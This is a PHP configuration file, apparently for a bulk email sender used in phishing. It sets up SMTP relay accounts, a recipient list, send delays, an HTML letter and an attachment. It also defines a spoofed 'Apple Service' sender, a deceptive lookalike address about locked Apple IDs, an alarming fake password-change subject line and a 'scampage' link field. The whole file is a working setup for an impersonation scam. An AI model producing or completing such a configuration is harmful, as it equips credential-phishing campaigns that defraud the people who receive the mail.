<?php
// xampp
//Regards
date_default_timezone_set('Asia/Jakarta');
$date = date('F d, Y, h:i A T');

/* SMTP SETUP */
$smtp_acc = [
    [
        "host"     => "smtp-relay.gmail.com",
        "port"     => "587",
        "username" => "",
        "password" => "",
    ],


];

/* Features SETUP */

$gx_setup = [
    "priority"       => 1,
    "userandom"      => 0,
    "sleeptime"      => 6,
    "replacement"    => 1,
    "filesend"       => 1,
    "userremoveline" => 0,
    "mail_list"      => "file/maillist/randymix.txt",
    "fromname"       => "Apple Service",
    "frommail"       => "noreplying-i.cloud-servicebzzzz@verifycationyouraccountlockedappleidappleid.com",
    "subject"        => "RE : [ Alert ] [ Summary News Report ] Confirmation change password of your apple account in Google Chrome [ 02 August 2018 ] FWD.",
    "msgfile"        => "file/letter/letter.html",
    "filepdf"        => "file/attachment/logo.ico",
    "scampage"       => ["https://google.com"],
];
